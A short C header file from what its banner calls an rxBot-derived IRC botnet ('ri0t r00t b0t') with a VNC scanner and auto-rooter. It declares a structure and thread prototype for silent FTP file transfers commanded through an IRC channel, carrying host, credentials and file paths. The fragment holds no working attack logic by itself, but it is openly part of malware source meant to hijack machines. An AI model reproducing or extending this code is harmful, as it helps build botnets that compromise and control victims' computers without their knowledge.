/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_FTPTRANS
typedef struct FTPTRANS
{
	char host[MAXHOSTNAME];
	char username[128];
	char password[128];
	char local[MAX_PATH];
	char remote[MAX_PATH];
	char chan[MAXCHANLEN];
	int threadnum;
	SOCKET sock;
	BOOL get;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FTPTRANS;

DWORD WINAPI FtpTransThread(LPVOID param);
#endif
